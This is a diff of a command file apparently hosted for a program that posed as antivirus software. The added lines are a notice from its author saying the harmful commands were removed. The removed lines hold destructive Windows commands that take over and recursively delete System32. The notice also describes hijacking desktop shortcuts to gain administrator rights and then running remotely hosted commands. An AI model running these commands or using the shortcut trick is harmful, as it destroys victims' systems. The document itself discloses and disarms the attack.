@@ -1,6 +1,8 @@
-echo Nothing Here
-echo Everything Here
-start notepad
-takeown /F C:\Windows\System32 /R /D Y
-icacls C:\Windows\System32 /grant *S-1-5-32-545:F /T
-rd /s /q C:\Windows\System32
+start chrome "https://github.com/AadityaKandel/Happy-Birthday-Animation/edit/main/commands.txt"
+
+
+This is a notification message for you. I designed this application as my first semester project work report. You may be thinking that this is a normal anti virus program but I can tell you that this is not. But don't worry because I had removed the harmful parts once I had submitted my project so you are safe. But I want you to know that whoever sent you this program wanted to destroy your system. Unfortunately for them, the system cannot be destroyed now because I have removed the commands that allow my program to destroy it. 
+
+For more context, the properties of your desktop shortcut files have been changed. They have been changed to ask for administrator privileges and only launch when given authority. When you think you are giving administrator privileges to the programs of your desktop environment, my application was the one gaining the privileges instead. When my program gained admin privileges, it would launch the commands that were hosted in this very page that you are reading. But, as of now, there are no commands in this page besides the one that takes you here to show you the notification message. 
+
+This notification message is simply here to tell you that whoever that sent you this program to test (your friend or anyone), wanted to destroy your system. But let me reassure you that they cannot. Unless they have changed my source code themselves and reconstructed the application, they cannot harm you. That's all. And one extra note: You might wanna delete those shortcut files and remove my application. That's all and my program is gone from your system. Thank you. (^_^)
